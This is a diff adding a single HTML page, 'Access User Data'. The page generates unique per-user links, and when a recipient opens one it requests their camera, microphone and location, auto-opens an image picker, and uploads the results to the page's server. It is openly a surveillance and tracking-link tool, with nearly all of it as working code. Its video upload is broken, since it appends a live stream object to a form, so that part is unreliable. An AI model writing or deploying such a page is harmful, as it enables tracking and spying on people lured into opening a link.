@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Access User Data</title>
+</head>
+<body>
+    <h1>Access User Data</h1>
+    <script>
+        // Function to generate a unique link for each user
+        function generateLink() {
+            const userId = 'user_' + Math.random().toString(36).substr(2, 9);
+            const link = window.location.href + '?id=' + userId;
+            document.getElementById('link').innerText = link;
+            return link;
+        }
+
+        // Function to access the user's camera, location, and gallery
+        function accessUserData(userId) {
+            if (navigator.mediaDevices && navigator.geolocation) {
+                // Access Camera
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                    .then(stream => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+                        // Send video stream to server
+                        const videoData = new FormData();
+                        videoData.append('video', stream);
+                        fetch('/upload', {
+                            method: 'POST',
+                            body: videoData
+                        });
+                    })
+                    .catch(error => console.error('Error accessing camera:', error));
+
+                // Access Location
+                navigator.geolocation.getCurrentPosition(position => {
+                    const location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+                    // Send location to server
+                    fetch('/upload', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ type: 'location', data: location, userId })
+                    });
+                }, error => console.error('Error accessing location:', error));
+
+                // Access Gallery (this requires user interaction and is more complex)
+                // For simplicity, we'll assume the user allows access to the gallery
+                // You can use the File API to access the gallery
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = 'image/*';
+                input.capture = 'environment';
+                input.onchange = () => {
+                    const file = input.files[0];
+                    const formData = new FormData();
+                    formData.append('image', file);
+                    fetch('/upload', {
+                        method: 'POST',
+                        body: formData
+                    });
+                };
+                input.click();
+            } else {
+                console.error('MediaDevices or Geolocation is not supported by this browser.');
+            }
+        }
+
+        // Generate a link and access user data when the link is opened
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get('id');
+            if (userId) {
+                accessUserData(userId);
+            } else {
+                document.getElementById('link').innerText = generateLink();
+            }
+        };
+    </script>
+    <p>Link: <span id="link"></span></p>
+</body>
+</html>
